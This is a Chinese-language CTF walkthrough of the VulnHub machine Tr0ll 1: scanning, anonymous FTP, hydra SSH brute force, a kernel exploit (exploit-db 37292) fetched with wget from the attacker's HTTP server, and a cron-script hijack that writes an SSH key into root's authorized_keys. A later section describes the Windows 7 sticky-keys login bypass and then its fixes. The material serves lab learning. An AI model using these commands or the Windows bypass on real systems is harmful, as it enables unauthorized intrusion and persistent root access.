> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_KOg0EFYrg-moIT1QX2kyg)

靶机地址：https://www.vulnhub.com/entry/tr0ll-1,100/

靶机难度：简单（CTF）

靶机发布日期：2014 年 8 月 14 日

靶机描述：Tr0ll 的灵感来自 OSCP 实验室中不断摇曳的机器

目标：得到 root 权限 & 找到 proof.txt

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

**一、信息收集**

![](https://mmbiz.qpic.cn/mmbiz_png/E2DLw6KKNIl2wuoyBtmicpicCP2ZCggtwolfqBQic5beDSoyRuDUbFQtwT2h9Z2eX8hia4xFjicxewhEmK4DlG4BdLQ/640?wx_fmt=png)

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaa5vRXF4RRUa89fibyGkwSeYbgwoviaU3uF8WJcgtpfPMXVpaF28YNXbg/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：**192.168.145.149**

我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaQQAZXceR5tKJnhLLV9RF6gfq5icurbZjqTdLRb0ePa5WVEfKEFzEExA/640?wx_fmt=png)

命令：nmap -sS -sV -T5 -A -p- 192.168.145.149

我们可以在上面看到 Nmap 找到开放的端口 22、80，其中暴露的 robots.txt 和 / secret 目录，还有 FTP 带有匿名登录名：Anonymous FTP login allowed

遵循 Nmap 的线索，开始进行攻击

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnianJgXqAiaOZ1yll2JemsaRX6k1f57ic05OmGUZ06XDshLrib5icLx7Oo6pA/640?wx_fmt=png)

登陆 ftp，查看有啥有用信息，这里会用到 FTP 基础知识

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniatr7RhSoxQINiaTQX8Dche9sKGicia56YMn36E3RKwHTIJVU6137UbUubg/640?wx_fmt=png)

查看当前目录，我们发现有一个名为 lol.pcap 的文件分析包，将文件下载到本地使用 Wireshark 打开查看（Wireshark 需要必须掌握的知识，不会的赶紧脑补）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia42C4feiaxbOvhLOtXDwxfDoymOzYfhibp4d7tWUniaZTsR1yemGLic3IibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZFNsFhbyayM0wuH9mOL4BhzGUgWQVoZ4MuJTSib59oGNqUsrTsSYHUg/640?wx_fmt=png)

wireshark 打开 lol.pcap 发现提示：

FTP Data ..........secret_stuff.txt

FTP Data Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol  Sucks, you were so close… gotta TRY HARDER!（硬生生给你们手打出来的....）

鉴于只发现了 SSH/FTP/HTTP，英文说让我使用 root/sup3rs3cr3tdirlol 登陆 ssh 失败告终！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniapyuwTE04RaNkk2OFHcpTVemPYt4ickXxrx9uSYzJDb6BrvicnlbrTBicQ/640?wx_fmt=png)

我以为我输入错了，经过错了几次，发现是个坑.... 哎

跳过这个... 继续寻找信息

从 web 渗透试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniadgI87ibQHTM355hsx65qTHxnoOWzN4AcgLNCE4HoGIiaaymveDoy2tibg/640?wx_fmt=png)

没啥有用的信息，继续浏览 robots.txt

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia60ImJiaAbWd2AvBTG02Mic3dur6K6Q0n2DmVlzGES2ibLJJ3zpdGvQCgQ/640?wx_fmt=png)

继续浏览 / secret

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnialV4vR2Ml6jLnrHFzbnfCLQ3J41P7sREF9en1pXzy1VrwricddKia8w9w/640?wx_fmt=png)

还是没什么好的信息，由于前面 wireshark 打开 lol.pcap 发现的信息 sup3rs3cr3tdirlol，我尝试着打开目录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaicKVyH0D75OC1dicXpk6xc11dw9Yl8Vlvr7qWXvibPy2ayo6Z9vwn9z5A/640?wx_fmt=png)

这里我就试着打开，还真有信息....

下载 roflmao 文件并检查其类型

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaNlrRGz4DewH1beB8h5cHkFIicvUt6CEibnxzMbNFJ3qCut39vOlnGJJQ/640?wx_fmt=png)

它是 32 位 ELF 可执行文件，使用 strings 字符串对其执行一些静态分析（前面章节有介绍）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniao0bQzZtpEibJzow4dAicbiajicsnvnorIyg1vlks9EbrFiavRFrDYFhqCDg/640?wx_fmt=png)

进来看到笑脸...Find address 0x0856BF to proceed 意思是找到地址 0x0856BF

进入看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia6mt778ybZUSz8HTmRJ4KicOTJCaRsWAnJUsZNXGPQ99XkQuXaO4L0Og/640?wx_fmt=png)

发现有两个文件夹：

good_luck（进入查看包含文件 which_one_lol.txt）this_folder_contains_password（进入查看包含文件 pass.txt）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia7Rfx9ZWjRIoAGJwEXnCiaTibuHMicXBHDdw39gYOU2389cje4sRk8GgAQ/640?wx_fmt=png)

这应该是用户名，因为下面有个 pass 密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaNpiaO79DGakwLCQ5cSUIBH36A85Giae0SodNdCxich7bJRL5scNwnjIjA/640?wx_fmt=png)

只有一个密码，将文件都下载下来... 使用九头蛇查看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaVAGXCiaZNNpuTSvibsBTJO27sgSsmdlOkCicvicJCv1ClflOQKf5icB4icxg/640?wx_fmt=png)

命令：hydra -L which_one_lol.txt -p Pass.txt 192.168.145.149 ssh

 login: overflow   

 password: Pass.txt

 ssh 登陆查看信息

 ![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniagIkUWiaiaCiaU3aBzmvYB54OUAFiao7GDCNq1Agh0yibZQZMe79MYVE5jiaA/640?wx_fmt=png)

 靶机正在运行 Ubuntu 14.04 和 3.13 内核，看看是否可以找到这些版本的任何特权升级漏洞

**二、提权**

![](https://mmbiz.qpic.cn/mmbiz_png/E2DLw6KKNIl2wuoyBtmicpicCP2ZCggtwolfqBQic5beDSoyRuDUbFQtwT2h9Z2eX8hia4xFjicxewhEmK4DlG4BdLQ/640?wx_fmt=png)

访问 exploit 官网查看到可利用提权 shell

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaickGrItLoUbibztyC6KWVJ9ia3DmAJpia0jXj0h1icNjoXOiaBgPGibmWCb0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniauYfmCEoXGpVP6JDjmocwqykcGicfPIBfXW76ZczR3hJMOr08JNgZscA/640?wx_fmt=png)

在 exploit 官网查看可以使用 37292 进行提权（之前文章也遇到过使用 37292 提权）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaIC9XJDFHm7uFGPn3D2IGbCHjlkgUaicnQQY3OzYGcc3eqIuG2cQXjjQ/640?wx_fmt=png)

cp  /usr/share/exploitdb/exploits/linux/local/37292.c /root 由于之前文章使用过我本地已经有 shell 了，然后使用 python 创建一个服务，通过服务上传 37292.c 到靶机中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniahY3G659bv5pykl9wZvcgPDbUsR0VEGibv3aQc2vqyOHYcOmm8l5SLqw/640?wx_fmt=png)

命令：python -m SimpleHTTPServer 5555

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniazvLr9L7DjbUia1dW0vGRwClsvrvkJ9eJicfAVPowkDfl1icp1kEhl2Gww/640?wx_fmt=png)

使用 python 获得的 shell 权限后，得使用 ptyhon 获得 tty，使用

命令：python -c 'import pty; pty.spawn("/bin/bash")'

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaXxWQrmxfu20YIFqZDVqJQsNuz3LM8bfIOykpXM5EP13ObIqK7v0B0w/640?wx_fmt=png)

命令：wget http://192.168.145.143:5555/37292.c

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniavLmZsbAbfNAAw84VxKJJtFH5l0wshnud6fD8iaDTSV43osUHCU74FAA/640?wx_fmt=png)

gcc 37292.c -o dayu

./dayu

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaXrjhyXKl4h6G9IaVxKU2nYPDkacQ1vwVqqjNrupE7VIW2t8sJuic59g/640?wx_fmt=png)

获得 root 权限，并查看 proof.txt 内容

**三、提权方法**

![](https://mmbiz.qpic.cn/mmbiz_png/E2DLw6KKNIl2wuoyBtmicpicCP2ZCggtwolfqBQic5beDSoyRuDUbFQtwT2h9Z2eX8hia4xFjicxewhEmK4DlG4BdLQ/640?wx_fmt=png)

这台靶机你们会遇到登陆 ssh overflow@192.168.145.149 后会 2 分钟就自动断开会话超时，然后得重新连接，这边继续讲另外一种提权方法（我这边回家操作了 IP 地址变动了）

会话自动断开，原因可能是设置了计划任务

查看日志 / var/log/cronlog

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniazxtSlib14Ezia8mbdGhz1fM8fYia26p3iaYKnXyE4vmAQeuxZQ0dUwI7tw/640?wx_fmt=png)

继续查看信息 / lib/log/cleaner.py

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaVYtbMvrvMS8N4WNEFNrNmngHYkpT21MlLrmX7j5xswJIJF7MnxVHEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaw4UMYXBzWExgERyZNYs0xE7grgEuuhRF17xFiaD6tJr5NdpDtvrR4zg/640?wx_fmt=png)

cleaner.py 脚本是以 root 权限执行的，并且该脚本是全局可写的，那么我们就可以利用这一点进行提权

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniatRzlRGW5VKtDCKWVWqlcib7bgslOc5h1lTQoFVvhe46K37Y56m0ST5g/640?wx_fmt=png)

使用 ssh-keygen（用来生成 ssh 公钥认证所需的公钥和私钥文件）

目录默认、密码 Pass.txt、反复输入密码即可在 / root/.ssh / 目录生成 id_rsa、 id_rsa.pub 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaSjtQEZbqWO6ibXIGFiclb3ibiaW1WVH5XbJicpYpbib3ic3Tu3vDZWEvHla3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia7pGS0ZydLCYoIicSfxrTpvQh9WW1o2IVL20krxSMYX2QM4zSllXypYA/640?wx_fmt=png)

将 id_rsa.pub 产生的密匙内容复制到文本中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniakHSVXprdMz5E8BvDOQuW13IOBZyxD92l4s4SUic89WdssyLACNX8MCg/640?wx_fmt=png)

使用 vim 修改 cleaner.py 文件

命令：

#!/usr/bin/env python

import os

import sys

try:

    os.system('mkdir /root/.ssh; chmod 775 .ssh; echo" 加上 id_rsa.pub 产生的密匙内容上图有例子 ">> /root/.ssh/authorized_keys')

except:

    sys.exit()

这脚本提供给大家，收藏慢慢累积学习

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniasHR60pq9sP7T41GtunmxeZcqrhuer2wsKnw7rsoHwR15AV4fp0tOTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Hju2o35jBmTq6KFH2V0l2rpO9o6GicBiaYibgkMVJKERutggHic6HP3Cv9MbAmNwCsjW8knnZZgmA1yceegAFSN4OA/640?wx_fmt=png)

出来后直接执行 ssh root@192.168.182.143，然后输入 Pass.txt 即可登录

这边的例子请用在正途！！后面还可以用反弹 shell，或者自己写木马 shell 去提权，目前我还比较菜... 在努力脑补！！

不缺乏更多的方式方法，方法知晓记得越来越多，网络安全就会在你面前形同一张纸，你想进入就动动手指即可！！

![](https://mmbiz.qpic.cn/mmbiz_png/IhUDNJicR5NCFnPJhYUTqib6NmY4leia2t3Fs2QenHUiaZRPguibTFokOE3Lput5g5a5tTlkf5GagGpiaojrZrVtnXvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FsnuXk0t6LH3R7BicuMFRt0dIZZSAvaWdqCcKn7hCMGrdXOlhdHXZsnZD9jF4DVYF7BEhGymY9NWXoWtYHprg0Q/640?wx_fmt=png)

此文章还未完...

由于我好朋友都和我说看不懂我的文章，我后期会陆陆续续分享一些生活中能简单利用的 windows 漏洞！

此方法针对的是未打最新补丁的用户（目前我身边的人 windows 都有这个漏洞... 看到的尽快打上补丁）

继续讲解的是利用 5 次 shift 漏洞破解 win7 密码

![](https://mmbiz.qpic.cn/mmbiz_png/CIpsyufmHGlKWFQ0s9VnoeClVtvoEyg8R37v9eicib9lE9INqRzwjR06DH5xeHVX81icLSWr94zdAaFPko9LBoU3Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniabHoiakHeOlcFeKPtooGGdGwQywlS6zJHlxNt4qzZakO3PphNVqqVOqw/640?wx_fmt=png)

连续按 5 次 shift 如果出现了和上图一样的界面，就存在此可利用漏洞！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaSd8MD2tVruibl8gHtZ5tLEE63kWaZibUD9ibIicwAFPYjW2RbLctj5rrvA/640?wx_fmt=png)

如果存在，右下角重新启动电脑

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZS6DQiaMmIOS17uUqCeic8HiaezKXzxAC5NQJr1XyrkChwf38TsO3lriaQ/640?wx_fmt=png)

然后在上图 “** 正在启动 Windows**” 界面强制关机，拔掉电源即可....!!!

在开机！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia0X5fo9EnQic3VofLM3d0Zibyse1ggIElaGsmy6oXhceWuHw7ws2VngxA/640?wx_fmt=png)

开机后会出现 ** 进入启动启动修复（推荐）** 选项界面，选择修复

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniabDicibexlgrHAg6yMr6413z2aLr2SpR4ENsjOYNEALDWTjb58qXicvOng/640?wx_fmt=png)

修复会进入这个界面，千万别点还原..... 点取消

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaMyuFZ1wjFYKmXZ2eUfLiagKIbibYicq8gRicXCLTgwe9GPG8ib0ldEZINmA/640?wx_fmt=png)

点查看问题详情

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaB4HJBQpqsGwdMeAmxO9UQLXicP6WibhXbEu1K4xsuY7rPUicm4ZUELFXA/640?wx_fmt=png)

点击 erofflps.txt 目录

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaQPq58joSzo3w9coSGssdcvrp07xNMWMKicVw7vtjY0oyKJD4I3qFf3g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaLFjIFbeib4MOsdS1TOq971xOicdvC79HibjxjU2z6sf93ibutib30FoLSwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia89nHFOGq8aUPJjc9AMZKav5nGvSkbPDAeKqFf2g8AC1SDOn6dllB7Q/640?wx_fmt=png)

到 C 盘 system32 目录下往下翻能看到蓝色的图标名称：sethc

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniacSNaAdRt1UgrBzkWNiahDPhfLb5lic6IOnnicsxq3fcARoicIp2yj7QIQQ/640?wx_fmt=png)

重命名文件改 123（名称随意改）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniawuEgPqQddTxpw6nols6NmIHc07NJy00VKvarz7F91ic7DpiamBaTIVdQ/640?wx_fmt=png)

继续往下找到黑色图标：CMD 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniawDjW3tV9Y38qEor3Jw2bzfIVmU0eO3Z9fw7ll3liaOEbfWov83iaibfQw/640?wx_fmt=png)

复制一个 cmd！！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia6KdbcaxQom1IgINdVoAibqVicVszkL59bVHz2I57jY5athjSZ4JoNHibA/640?wx_fmt=png)

将复制的 cmd 副本改名

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWnia6KdbcaxQom1IgINdVoAibqVicVszkL59bVHz2I57jY5athjSZ4JoNHibA/640?wx_fmt=png)

改成 sethc

然后关掉记事本文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaOxvBlhib55c5doVfKnmBa4kENYmOicBuQ3lwa4UbptCiaM9rNxrMh8EqQ/640?wx_fmt=png)

完成重启即可

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZ0AwoRUpW8iaps0icgrRhhLd45BdsNbvambPvMWKXzIrWo7KHfFqFTfg/640?wx_fmt=png)    

到用户密码输入界面连续按 5 次 shift 即可出现上图，到了这儿下一步我就不教了，希望大家慎重！！

下面我教大家修复的办法:

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaZwueficRiaKSECpURYOiak7oNiaZA6o0ga5fljMWNLric3JZjyqBD68QWjQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniauLzZia8yuIKr4RNw8TbBQWl8gPhJWPg8rNjFcXyYFvE3V56z5Ch837w/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/FsnuXk0t6LH3R7BicuMFRt0dIZZSAvaWdqCcKn7hCMGrdXOlhdHXZsnZD9jF4DVYF7BEhGymY9NWXoWtYHprg0Q/640?wx_fmt=png)

这方法只能缓解，有时候重启电脑就不生效了，如果系统盘为 NTFS 文件系统，可以将 sytem32 下的 sethc.exe 文件设为 everyone 拒绝访问, 或者直接将其删除，最好的方法是在控制面板 - 辅助功能选项 - 粘滞键选项，将 “使用快捷键” 取消即可。

最有效的方法就是更新系统补丁至最新！！！！！

由于我们已经成功得到 root 权限 & 找到 proof.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/CIpsyufmHGlKWFQ0s9VnoeClVtvoEyg8R37v9eicib9lE9INqRzwjR06DH5xeHVX81icLSWr94zdAaFPko9LBoU3Q/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaIlQnxBnPxa95sTicYQ6Fg7uIPxpK9VNNibnv4qjxpcJbWFnjbStaSUVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/gCicgvu68od8ibyiahYEJ6XV4kkaUeCEMF4HvIuuPYGVxwMtGDTnb3ibDXjDke8TFG6yicwwEJ2Ik6QzI6c7oT5iczvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MKHUQ8R7BXBibc5TT0bsGFoG25ZFjUbyQtK7icU5VDD6Lxme5yKgoWpaDXd9HmZ1kfkhR3dbQ80dlu2jHJBSkCPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VGhME4y0QLo3MIKX2xqqYXyKcoyCiaukQAj90M7CCMfhUskicraSNIaK2icT70MmUaHEJKiat91cPOZRkEs78qAHlQ/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流渗透，一起成长学习！

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMicWNmmicnKCib07dL1RwFWniaAPyzQq8Y6flPMewUURAPYJVN8WTAl8BMqBiasuMSf7MKPMnlYJFAwPg/640?wx_fmt=png)